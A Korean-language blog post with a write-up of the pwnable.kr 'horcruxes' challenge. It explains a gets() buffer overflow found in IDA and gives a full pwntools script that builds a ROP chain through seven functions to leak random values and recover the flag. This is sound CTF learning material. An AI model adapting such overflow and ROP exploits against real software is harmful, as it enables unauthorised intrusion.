---
layout: post
title: "[pwnable.kr] horcruxes 풀이"
date: 2018-09-04 19:01
categories: "[Pwn]pwnable.kr"
tags: "#UnKN0wn"
---
>## horcruxes - [7pt]
### Voldemort concealed his splitted soul inside 7 horcruxes.
### Find all horcruxes, and ROP it!
### author: jiwon choi<br><br>
### ssh horcruxes@pwnable.kr -p2222 (pw:guest)

---

ROP를 사용하는 문제라네요

ssh로 연결해보면 `horcruxes`와 `readme`라는 파일이 있어요.

`horcruxes`를 IDA를 이용해 분석하기위해 scp 명령어를 사용했어요

> $ scp -P 2222 horcruxes@pwnable.kr:/home/horcruxes/horcruxes ~/

# 1. 프로그램 분석

{: refdef: style="text-align: center;"}
![init_ABCDEFG](/pic/pwnable_kr/horcruxes/hor_init_ABCDEFG.png)
{: refdef}

<center> <init_ABCDEFG 함수> <center>

전역변수 a,b,c,d,e,f,g의 값을 랜덤으로 정해주고 모든 합을 sum에 저장하는 함수인거 같네요

{: refdef: style="text-align: center;"}
![ropme](/pic/pwnable_kr/horcruxes/hor_ropme.png)
{: refdef}

<center> <ropme 함수> <center>

각 A,B,C,D,E,F,G 함수는 각각의 변수들의 값을 출력해주는 함수가 있어요

이리고 이 모든 변수값을 더한 sum 값과 gets로 입력한 값이 같으면 flag를 출력해주는 함수네요

그런데 이 각각의 함수에서 변수 값을 출력하기위해서는

계속 랜덤값으로 바뀌는 각각의 변수 값을 알아야하는데

불가능해요

그런데 `gets(s)` 부분에서 BOF가 일어나서 return 주소를 바꿔줄 수 있어요

이 부분을 이용해 exploit 코드를 짜봅시다

# 2. Exploit

```python
from pwn import *
#context.log_level='debug'

#connect ssh
s = ssh("horcruxes", "pwnable.kr", port=2222, password="guest")
#connect nc
n = s.remote("localhost", 9032)

#function address
func_A = 0x0809FE4B
func_B = 0x0809FE6A
func_C = 0x0809FE89
func_D = 0x0809FEA8
func_E = 0x0809FEC7
func_F = 0x0809FEE6
func_G = 0x0809FF05
ROPME = 0x0809FFFC

n.recvuntil('Menu:')
n.sendline('0')
n.recvuntil('earned? : ')

#ROP
payload = ""
payload += "A"*120      #buffer + sfp
payload += p32(func_A)  #return
payload += p32(func_B)
payload += p32(func_C)
payload += p32(func_D)
payload += p32(func_E)
payload += p32(func_F)
payload += p32(func_G)
payload += p32(ROPME)

n.sendline(payload)
total = 0

#calculate EXP
for i in range(0,7):
    n.recvuntil('EXP +')
    total += int(n.recvuntil(')')[:-1])
    log.info('total = ' + str(total))

#return to function 'ROPME'
n.recvuntil("Menu:")
n.sendline("0")
n.recvuntil("earned? : ")
n.sendline(str(total))

log.info("flag is : " + n.recv())
```

이런식으로 exploit 코드를 짜니 flag가 나오긴 했어요

그런데 한번씩 flag가 안나올 때가 있는데 아마 EXP값이

음수가 나올 경우가 있기 때문인거 같네요 

![exploit](/pic/pwnable_kr/horcruxes/hor_ex.png)

